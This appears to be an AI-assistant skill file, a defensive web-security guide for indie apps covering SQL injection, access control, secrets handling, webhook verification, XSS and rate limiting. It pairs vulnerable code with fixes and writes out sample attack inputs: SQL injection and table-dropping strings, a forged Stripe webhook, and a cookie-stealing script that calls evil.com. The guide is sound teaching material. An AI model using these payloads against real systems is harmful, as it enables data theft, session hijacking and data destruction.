Complete security guide for indie and vibe-coded web apps — covering SQL injection prevention, input validation, secrets management, webhook signature verification, broken access control, XSS prevention, and rate limiting. Use this skill whenever the user is building anything that stores user data, handles payments, takes user input, calls a database, or exposes an API. Also trigger for phrases like "how do I make this secure", "is this safe", "can this be hacked", "search bar security", "SQL injection", "protect my API", "secure my backend", "should I validate input", "how do I store secrets", "is my webhook safe". This skill should be consulted for EVERY backend feature — security is not optional and AI almost always skips it by default. Always apply these rules before writing any route, controller, or database query.Security Hardening Skill
The Core Problem
AI optimizes for making code work on the happy path. Attackers never take the happy path. Every piece of user input, every API endpoint, every database query is a potential attack surface. These protections must be explicitly added — AI skips them by default.

Attack 1: SQL Injection (Search Bars, Filters, Any User Input into DB)
What It Is
User types into a search bar. The query goes directly into SQL. The attacker types SQL commands instead of a search term.
Vulnerable code — what AI writes:
javascriptconst query = `SELECT * FROM users WHERE name = '${searchInput}'`
db.run(query)
What the attacker types:
' OR '1'='1
What the database sees:
sqlSELECT * FROM users WHERE name = '' OR '1'='1'
-- Returns EVERY user in the database
Destruction variant:
'; DROP TABLE users; --
The Fix: Parameterized Queries — Always
javascript// CORRECT — user input is treated as data, never as SQL
const query = `SELECT * FROM users WHERE name = ?`
db.run(query, [searchInput])

// PostgreSQL syntax
const result = await db.query(
  'SELECT * FROM users WHERE name = $1',
  [searchInput]
)

// Prisma (automatically parameterized)
const users = await prisma.user.findMany({
  where: { name: searchInput }
})
Rule: Never concatenate user input into a SQL string. Ever. No exceptions.
Tell Cursor This

"Use parameterized queries everywhere — never concatenate user input, request parameters, or any external data into SQL strings. Use ? placeholders (MySQL/SQLite) or $1 placeholders (PostgreSQL)."


Attack 2: Input Validation — Never Trust What Comes In
What It Is
Attackers don't use your frontend. They send raw HTTP requests with whatever data they want. If your backend doesn't validate, they can send:

Negative prices on an order
Someone else's user ID to access their data
A <script> tag in a name field that runs in other browsers (XSS)
A 500MB string that crashes your server
An email field containing SQL
A boolean field containing {"$ne": null} (NoSQL injection)

Validation on Every Input
javascript// Using express-validator
const { body, param, validationResult } = require('express-validator')

const createProjectRules = [
  body('name')
    .trim()
    .notEmpty().withMessage('Name is required')
    .isLength({ max: 100 }).withMessage('Name too long')
    .escape(),   // strips HTML tags — prevents XSS stored in DB

  body('description')
    .optional()
    .trim()
    .isLength({ max: 2000 })
    .escape(),

  body('price')
    .isFloat({ min: 0 }).withMessage('Price must be positive')
]

async function createProject(req, res) {
  const errors = validationResult(req)
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() })
  }
  // now safe to use req.body
}
What to Always Validate
Input typeWhat to checkStringsLength min/max, allowed characters, trim whitespaceNumbersIs it actually a number? Min/max range? Integer or float?EmailsValid email formatPasswordsMinimum length, complexity if requiredIDsUUID format before hitting DBPrices/amountsPositive number, max ceilingDatesValid date, not in the past if requiredFilesMIME type, file size limitJSON bodySchema validation, reject unknown fields

Attack 3: Broken Access Control (Most Common Vulnerability)
What It Is
A user requests data that belongs to another user. Your backend returns it because it only checks if the user is logged in — not if they own the resource.
Vulnerable code:
javascriptasync function getProject(req, res) {
  const project = await Project.findById(req.params.id)
  // Gets ANY project by ID — attacker just iterates IDs
  res.json(project)
}
Attacker does:
bashGET /api/projects/1
GET /api/projects/2
GET /api/projects/3
# Gets everyone's projects
The Fix: Always Scope Queries to the Logged-In User
javascriptasync function getProject(req, res) {
  const project = await Project.findById(req.params.id, req.user.id)
  // Only returns project if it belongs to this user
  if (!project) return res.status(404).json({ error: 'Not found' })
  res.json(project)
}

// In the model:
async findById(id, userId) {
  const result = await db.query(
    'SELECT * FROM projects WHERE id = $1 AND user_id = $2',
    [id, userId]   // Must match BOTH id and user_id
  )
  return result.rows[0] || null
}
Rule: Every DB query that returns user data must filter by the logged-in user's ID.
Tell Cursor This

"Always scope database queries to req.user.id — never fetch a resource by ID alone. The query must check BOTH the resource ID and user_id to prevent users from accessing each other's data."


Attack 4: Secrets Exposure
What AI Does Wrong

Hardcodes API keys in code files
Puts database URLs in the codebase
Commits .env files to GitHub

GitHub has bots that scan every public push for API keys. They find keys within minutes. Then they use your OpenAI key to generate content, your Stripe key to issue refunds, your DB credentials to dump your database.
The Rules
bash# .gitignore — always include these
.env
.env.local
.env.production
*.pem
*.key
config/secrets.json
javascript// Wrong — hardcoded
const stripe = new Stripe('sk_live_abc123hardcoded')

// Wrong — env var accessed directly everywhere
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY)  // scattered in 8 files

// Right — all secrets through config/env.js
const { stripe: stripeKey } = require('../config/env')
const stripe = new Stripe(stripeKey)
Frontend Secret Rule
Never put secret API keys in frontend code. The browser is public. Anyone can see it.

❌ OpenAI key in React component
❌ Stripe secret key in frontend
✅ Stripe publishable key in frontend (designed to be public)
✅ All secret keys in backend only

Tell Cursor This

"All environment variables and secrets go in .env and are loaded through config/env.js. Never hardcode any API key, database URL, or secret in any code file. Never put secret keys in frontend code — only Stripe's publishable key is safe for the browser."


Attack 5: Fake Webhooks
What It Is
When Stripe, GitHub, or any service sends a webhook to your server, anyone can fake that request. Without verification, a hacker sends:
bashPOST /webhooks/stripe
{"type": "invoice.payment_succeeded", "data": {"object": {"customer": "cus_abc123"}}}
# Your server upgrades the user without them paying
The Fix: Signature Verification
javascript// Stripe webhook verification
app.post('/webhooks/stripe',
  express.raw({ type: 'application/json' }),  // MUST be raw buffer, not parsed JSON
  (req, res) => {
    let event
    try {
      event = stripe.webhooks.constructEvent(
        req.body,                              // raw buffer
        req.headers['stripe-signature'],
        process.env.STRIPE_WEBHOOK_SECRET
      )
    } catch (err) {
      return res.status(400).json({ error: 'Webhook signature invalid' })
    }
    // Only reaches here if Stripe actually sent it
    handleEvent(event)
    res.json({ received: true })
  }
)
Every major service has this — always implement it.

Attack 6: Mass Assignment
What It Is
AI writes controllers that spread the entire request body into DB updates. The attacker adds fields the user shouldn't control.
Vulnerable code:
javascriptasync function updateUser(req, res) {
  await User.update(req.user.id, req.body)
  // Attacker sends: { name: "Bob", is_admin: true, plan: "pro" }
  // All of it goes into the DB
}
The Fix: Explicit Field Allowlist
javascriptasync function updateUser(req, res) {
  // Only allow specific fields — never spread the whole body
  const { name, bio, avatar_url } = req.body
  await User.update(req.user.id, { name, bio, avatar_url })
  // Attacker's is_admin field is ignored because it was never destructured
}

Attack 7: XSS (Cross-Site Scripting)
What It Is
User submits content with <script> tags. Your app stores it and displays it to other users. The script runs in their browser — stealing their session, redirecting them, or worse.
Name: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
The Fixes
On input: Sanitize before storing
javascriptconst { escape } = require('express-validator')
// or
const DOMPurify = require('isomorphic-dompurify')
const clean = DOMPurify.sanitize(userInput)
On output (React): React escapes by default — never use dangerouslySetInnerHTML with user content
HTTP Headers: Add these to every response
javascript// In app.js
const helmet = require('helmet')
app.use(helmet())  // Sets Content-Security-Policy, X-XSS-Protection, and more

Rate Limiting — Protect Money and Resources
javascriptconst rateLimit = require('express-rate-limit')

// Strict limit for expensive AI routes — protects your wallet
const aiLimit = rateLimit({
  windowMs: 60_000,  // 1 minute
  max: 10,
  message: { error: 'Too many AI requests — please wait a moment' }
})

// Auth routes — prevent brute force
const authLimit = rateLimit({
  windowMs: 15 * 60_000,  // 15 minutes
  max: 5,
  skipSuccessfulRequests: true,
  message: { error: 'Too many login attempts — try again in 15 minutes' }
})

// General API routes
const generalLimit = rateLimit({
  windowMs: 60_000,
  max: 100
})

Password Storage
javascriptconst bcrypt = require('bcrypt')
const SALT_ROUNDS = 12

// Storing password
async function register(email, password) {
  const hash = await bcrypt.hash(password, SALT_ROUNDS)
  await User.create({ email, password_hash: hash })
  // Never store the plain password
}

// Verifying password
async function login(email, password) {
  const user = await User.findByEmail(email)
  if (!user) return null

  const match = await bcrypt.compare(password, user.password_hash)
  if (!match) return null

  return user
}
Never store plain text passwords. Never log passwords. Never compare passwords with == .

Security Checklist — Apply to Every Feature
Input

 All user input validated with type, length, format checks
 No user input concatenated into SQL strings — parameterized queries only
 All strings sanitized before storing in DB
 File uploads: MIME type verified, size limited

Auth & Access

 Protected routes have requireAuth middleware
 Every resource query scoped to req.user.id
 Sensitive actions (delete, admin) have additional authorization checks
 Passwords hashed with bcrypt before storing

Secrets

 All API keys in .env — never in code files
 .env in .gitignore
 No secret keys sent to or stored in the frontend
 config/env.js validates all required vars on startup

Webhooks & External

 Webhook signature verified before processing
 Webhook handler uses raw body buffer, not parsed JSON
 Price IDs on server only — never trust price from frontend

Infrastructure

 Rate limiting per route — stricter on expensive/auth routes
 helmet middleware applied in app.js
 CORS configured to allow only your frontend domain


Master Security Prompt for Cursor
Paste at the start of any backend session:
Security requirements — apply to every endpoint and query:
1. Parameterized queries only — never concatenate user input into SQL
2. Validate and sanitize all req.body, req.params, req.query inputs before using them
3. Scope all DB queries to req.user.id — check user_id in every WHERE clause on user data
4. Explicit field allowlists in updates — never spread req.body directly
5. Secrets in .env only, loaded through config/env.js — nothing hardcoded
6. Webhook handlers verify signature with raw body buffer before processing
7. Rate limiting applied per route — AI routes max 10/min, auth routes max 5/15min
8. Add helmet() middleware to app.js
9. CORS restricted to frontend domain only
10. Passwords hashed with bcrypt — never stored plain